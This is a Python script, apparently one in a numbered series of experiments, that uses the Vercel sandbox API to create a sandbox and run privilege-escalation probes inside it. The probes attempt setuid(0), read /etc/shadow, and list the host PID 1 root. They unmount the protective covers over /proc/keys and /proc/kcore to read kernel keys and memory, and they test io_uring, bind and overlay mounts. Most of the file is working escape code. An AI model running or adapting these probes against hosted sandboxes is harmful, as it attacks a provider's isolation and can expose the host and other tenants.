# 实验J174: setuid(0)提权 + umount防护覆盖 + kcore读取 + io_uring重测
# 动机: j173发现 初始user ns + 全cap(CAP_SETUID) + mount可用 ->
#       1) setuid(0)可能直接成功 (沙箱进程变真root)
#       2) umount /proc/kcore|/proc/keys (devtmpfs覆盖) -> 恢复真实文件
#       3) io_uring EFAULT重测 (valid params)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=5000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj174"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# 阶段A: setuid(0) 测试 (低风险先行)
PA = r'''
import os, ctypes
out = open("/tmp/d174a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("uid_before", os.getuid(), "euid", os.geteuid())
libc = ctypes.CDLL("libc.so.6", use_errno=True)
r = libc.setuid(0)
e = ctypes.get_errno()
p("setuid0", r, "errno", e, os.strerror(e) if e else "OK")
p("uid_after", os.getuid(), "euid", os.geteuid())
if os.getuid() == 0:
    # 已 root: 读 /etc/shadow 头部 (沙箱rootfs)
    try:
        with open("/etc/shadow") as f:
            p("shadow", f.read()[:200])
    except Exception as ex:
        p("shadow_err", repr(ex))
    # 读 /proc/1/root 下敏感 (j79: 宿主PID1视图, /root 被覆盖为shell空目录)
    for path in ["/proc/1/root/root", "/proc/1/root/opt", "/proc/1/root/var"]:
        try:
            p("p1root_list", path, os.listdir(path)[:10])
        except Exception as ex:
            p("p1root_err", path, repr(ex))
p("=== A_DONE")
out.close()
'''

# 阶段B: umount 防护覆盖 -> 恢复真实 /proc/keys /proc/kcore
PB = r'''
import os, ctypes
out = open("/tmp/d174b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)

# 先确保 root
if os.getuid() != 0:
    libc.setuid(0)

def um(n):
    r = libc.syscall(166, n, 0)  # umount2? 不, umount=166 单参数; umount2=166 双参(带flags)
    return r, ctypes.get_errno()

# umount2 (166) flags=0
r, e = um(b"/proc/keys")
p("umount_keys", r, "errno", e, os.strerror(e) if e else "OK")
try:
    with open("/proc/keys") as f:
        d = f.read()
        p("proc_keys_read", "len", len(d), "head", repr(d[:200]))
except Exception as ex:
    p("proc_keys_err", repr(ex))

r, e = um(b"/proc/kcore")
p("umount_kcore", r, "errno", e, os.strerror(e) if e else "OK")
try:
    st = os.stat("/proc/kcore")
    p("kcore_stat", st.st_size, st.st_mode)
    with open("/proc/kcore", "rb") as f:
        d = f.read(512)
        p("kcore_head", d[:32].hex())
except Exception as ex:
    p("kcore_err", repr(ex))
p("=== B_DONE")
out.close()
'''

# 阶段C: io_uring重测 + bind干净重测 + overlay参数
PC = r'''
import os, ctypes, struct
out = open("/tmp/d174c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
def syscall(n, *args):
    r = libc.syscall(n, *args)
    return r, ctypes.get_errno()

# io_uring_setup with valid params buffer
buf = ctypes.create_string_buffer(120)
r, e = syscall(425, 8, ctypes.addressof(buf))
p("io_uring_valid", r, "errno", e, os.strerror(e) if e else "OK")
if r >= 0: os.close(r)

# bind 干净测试 (全新目录)
for d in ["/tmp/b1", "/tmp/b2"]:
    os.makedirs(d, exist_ok=True)
r, e = syscall(165, b"/tmp/b1", b"/tmp/b2", b"", 4096, b"")
p("bind_clean", r, "errno", e, os.strerror(e) if e else "OK")

# overlay 带参数: lowerdir=/tmp/b1,upperdir=/tmp/b2,workdir=/tmp/w
os.makedirs("/tmp/w", exist_ok=True)
opts = b"lowerdir=/tmp/b1,upperdir=/tmp/b2,workdir=/tmp/w"
r, e = syscall(165, b"overlay", b"/tmp/b2", b"overlay", 0, opts)
p("overlay_opts", r, "errno", e, os.strerror(e) if e else "OK")

# 3. umount 已挂载的 /etc/hosts (bind源) -> 看底层
r, e = syscall(166, b"/etc/hosts", 0)
p("umount_hosts", r, "errno", e, os.strerror(e) if e else "OK")
try:
    with open("/etc/hosts") as f:
        p("hosts_after", f.read()[:100])
except Exception as ex:
    p("hosts_err", repr(ex))
p("=== C_DONE")
out.close()
'''

steps = [
    ("setuid", "/tmp/d174a.txt", PA),
    ("umount-uncover", "/tmp/d174b.txt", PB),
    ("syscall-retest", "/tmp/d174c.txt", PC),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=120)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 5000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
